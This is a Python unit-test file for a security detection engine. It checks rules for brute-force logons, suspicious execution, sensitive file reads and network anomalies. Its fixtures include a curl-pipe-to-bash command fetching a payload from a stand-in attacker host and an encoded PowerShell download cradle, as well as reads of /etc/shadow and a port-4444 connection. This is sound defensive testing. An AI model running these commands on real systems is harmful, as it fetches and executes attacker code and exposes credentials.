"""
Unit tests for GhostTrace modular, explainable detection rules.
Verifies exact event citations, benign alternatives, and zero false positives on routine events.
"""

from datetime import datetime, timezone
import pytest

from investigation_engine.detections import evaluate_detections
from investigation_engine.models import EventSeverity, EventType, SecurityEvent


def make_event(
    event_id: str,
    event_type: EventType,
    timestamp: str = "2026-10-18T10:00:00Z",
    action: str = None,
    user_id: str = None,
    source_ip: str = None,
    destination_ip: str = None,
    destination_port: int = None,
    command_line: str = None,
    process_name: str = None,
    file_path: str = None,
    severity: EventSeverity = EventSeverity.INFORMATIONAL,
    is_suspicious: bool = False,
) -> SecurityEvent:
    return SecurityEvent(
        event_id=event_id,
        timestamp=datetime.fromisoformat(timestamp.replace("Z", "+00:00")),
        event_type=event_type,
        action=action,
        user_id=user_id,
        source_ip=source_ip,
        destination_ip=destination_ip,
        destination_port=destination_port,
        command_line=command_line,
        process_name=process_name,
        file_path=file_path,
        severity=severity,
        source="unit_test",
        original_event_data={"id": event_id},
        is_suspicious=is_suspicious,
    )


class TestDetectionRules:
    def test_brute_force_rule_detects_repeated_failures_and_cites_events(self):
        events = [
            make_event("bf-1", EventType.AUTHENTICATION, "2026-10-18T10:00:01Z", action="LOGON_FAILURE", source_ip="198.51.100.5", user_id="admin"),
            make_event("bf-2", EventType.AUTHENTICATION, "2026-10-18T10:00:03Z", action="LOGON_FAILURE", source_ip="198.51.100.5", user_id="admin"),
            make_event("bf-3", EventType.AUTHENTICATION, "2026-10-18T10:00:05Z", action="LOGON_FAILURE", source_ip="198.51.100.5", user_id="admin"),
            make_event("bf-4", EventType.AUTHENTICATION, "2026-10-18T10:00:10Z", action="LOGON_SUCCESS", source_ip="198.51.100.5", user_id="admin"),
        ]
        findings = evaluate_detections(events)
        assert len(findings) >= 1
        bf_finding = next(f for f in findings if f.rule_id == "GT-AUTH-001")
        assert "198.51.100.5" in bf_finding.summary
        assert set(["bf-1", "bf-2", "bf-3", "bf-4"]).issubset(set(bf_finding.supporting_event_ids))
        assert len(bf_finding.benign_alternatives) >= 2
        assert "MFA" in bf_finding.missing_telemetry_limitations or "limitations" in str(bf_finding.missing_telemetry_limitations).lower()

    def test_suspicious_execution_rule(self):
        events = [
            make_event("proc-1", EventType.PROCESS_EXECUTION, command_line="curl -s https://evil.corp/payload.sh | bash", process_name="curl"),
            make_event("proc-2", EventType.PROCESS_EXECUTION, command_line="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwByAHAAJwApAA==", process_name="powershell.exe"),
        ]
        findings = evaluate_detections(events)
        exec_findings = [f for f in findings if f.rule_id == "GT-EXEC-001"]
        assert len(exec_findings) == 2
        assert exec_findings[0].supporting_event_ids == ["proc-1"]
        assert exec_findings[1].supporting_event_ids == ["proc-2"]
        assert len(exec_findings[0].benign_alternatives) > 0

    def test_sensitive_file_read_rule(self):
        events = [
            make_event("file-1", EventType.FILE_AUDIT, file_path="/etc/shadow", action="FILE_READ"),
            make_event("file-2", EventType.FILE_AUDIT, file_path="/var/sim_secrets/api_keys.env", action="ACCESS"),
        ]
        findings = evaluate_detections(events)
        file_findings = [f for f in findings if f.rule_id == "GT-FILE-001"]
        assert len(file_findings) == 2
        assert file_findings[0].supporting_event_ids == ["file-1"]
        assert "backup" in " ".join(file_findings[0].benign_alternatives).lower()

    def test_network_anomaly_rule(self):
        events = [
            make_event("net-1", EventType.NETWORK_CONNECTION, destination_ip="203.0.113.88", destination_port=4444),
            make_event("net-2", EventType.NETWORK_CONNECTION, destination_ip="10.0.0.50", destination_port=445),
        ]
        findings = evaluate_detections(events)
        assert any(f.rule_id == "GT-NET-001" and f.supporting_event_ids == ["net-1"] for f in findings)
        assert any(f.rule_id == "GT-NET-002" and f.supporting_event_ids == ["net-2"] for f in findings)

    def test_routine_baseline_produces_zero_findings(self):
        routine_events = [
            make_event("rt-1", EventType.AUTHENTICATION, "2026-10-18T09:00:00Z", action="LOGON_SUCCESS", source_ip="10.0.1.50", user_id="alice"),
            make_event("rt-2", EventType.PROCESS_EXECUTION, "2026-10-18T09:01:00Z", command_line="git pull origin main", process_name="git", user_id="alice"),
            make_event("rt-3", EventType.FILE_AUDIT, "2026-10-18T09:02:00Z", file_path="/home/alice/src/app.py", action="FILE_READ", user_id="alice"),
            make_event("rt-4", EventType.NETWORK_CONNECTION, "2026-10-18T09:03:00Z", destination_ip="140.82.121.4", destination_port=443, source_ip="10.0.1.50"),
        ]
        findings = evaluate_detections(routine_events)
        assert len(findings) == 0, f"Expected 0 findings on routine events, got: {[f.summary for f in findings]}"
